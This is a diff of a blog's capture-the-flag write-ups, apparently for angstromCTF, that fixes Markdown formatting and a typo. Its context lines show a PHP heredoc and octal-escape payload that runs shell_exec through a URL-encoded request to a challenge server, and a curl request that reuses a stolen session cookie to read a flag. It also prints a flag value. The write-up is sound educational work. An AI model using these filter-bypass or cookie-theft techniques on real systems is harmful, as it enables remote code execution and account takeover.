@@ -27,14 +27,15 @@ shell_exec('ls')
 
 It will be difficult to work with both the parenthesis here as well as the single quotes, so we can take advantage of the fact that php functions can both be executed in the form of `shell_exec('ls')` OR `("shell_exec")("ls")`. We can combine this with [heredoc syntax](https://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc) to form our payload. 
 
-Heredoc essentialy allows to express double quotes with the characters "<<<", some header character (I chose _), and some newlines. I then formed this:
+Heredoc essentialy allows to express double quotes with the characters "{% raw %}<<<{% endraw %}", some header character (I chose{% raw %} _{% endraw %}), and some newlines. I then formed this:
+{% raw %}
 (<<<_
  shell_exec)
  _
  (<<<_
  ls)
  _
-
+{% endraw %}
 Of course, strings are not allowed, but in PHP, we can encode them by using the escape character and converting them into octal values. `shell_exec` converts to `/163/150/145/154/154/137/145/170/145/143`, and `ls` converts to `/154/163`. To make a valid get request, I url encoded the converted numbers and got this final payload: `http://45.129.40.107:9668/?formula=(%3C%3C%3C_%0A%5C163%5C150%5C145%5C154%5C154%5C137%5C145%5C170%5C145%5C143%0A_)(%3C%3C%3C_%0A%5C154%5C163%0A_)`
 
 The code successfully executed and I saw this: 
@@ -43,7 +44,7 @@ The code successfully executed and I saw this:
 
 From here, we can visit this endpoint: `http://45.129.40.107:9668/flag-eucmCjFHC1oimI0d9XxT7JzANCVOhrFX2OVdy8NxGQ3aPxDLd4WwwQ82eMKlRZBy.txt` since we know the name of the flag file, and the flag is displayed:
 
-[SimpleCalculator](/assets/SimpleCalculatorFlag.jpg)
+![SimpleCalculator](/assets/SimpleCalculatorFlag.jpg)
 
 This was a nice challenge. It reminds me of a lot of other PHP challenges I've done, which seem to have a common theme of filter bypass through some syntax trickery. Once in a while, it's fun to do these. 
 
@@ -91,7 +92,7 @@ This is very cool because we are not necessarily getting the server to send us r
 Anyways, with the token, I made this cURL request: `curl https://markdown.web.actf.co/flag -H 'cookie: token=d15453b0234690ccbb91861e'`
 and got the flag: `actf{b534186fa8b28780b1fcd1e95e2a2e2c}`.
 
-This is the first XSS challenge of the blog, and I am still very inexperience with it. That being said, it is a quite expansive vulnerability and one of the most common. I hope to do more of these that cover harder concepts like CSP bypasses or even client side template injections.
+This is the first XSS challenge of the blog, and I am still very inexperienced with it. That being said, it is a quite expansive vulnerability and one of the most common. I hope to do more of these that cover harder concepts like CSP bypasses or even client side template injections.
 
 ## GUESS THE FLAG - ANGSTROMCTF (REV)
 
